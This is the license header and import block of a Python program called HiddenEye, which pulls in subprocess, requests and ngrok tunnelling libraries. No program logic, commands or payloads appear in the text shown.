#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


import base64
import getpass
import re as regular_expression
import signal
import socket
from distutils.dir_util import copy_tree as webpage_set
from os import (chdir, chmod, getuid, kill, mkdir, path, remove, replace, stat,
                system)
from pathlib import Path as pathlib_Path
from platform import system as platform_os
from shutil import copyfile, rmtree
from subprocess import DEVNULL, PIPE, CalledProcessError
from subprocess import Popen as run_background_command
from subprocess import call as run_command
from subprocess import check_call as try_to_run_command
from subprocess import check_output
from time import sleep as wait

import requests
from pgrep import pgrep as check_process
from pyngrok import ngrok
